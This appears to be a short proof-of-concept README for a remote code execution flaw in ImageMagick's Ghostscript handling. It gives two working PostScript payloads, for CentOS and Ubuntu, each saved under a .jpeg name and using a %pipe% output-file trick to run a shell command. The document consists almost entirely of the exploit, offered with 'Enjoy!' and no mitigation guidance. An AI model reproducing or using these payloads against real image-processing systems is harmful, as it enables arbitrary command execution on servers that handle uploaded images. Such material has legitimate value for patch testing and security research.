# ImageMagick Ghostscript RCE

## POC

### Centos 

```
$ cat shellexec.jpeg
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

### Ubuntu

```
$ cat shellexec.jpeg
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

## Enjoy!
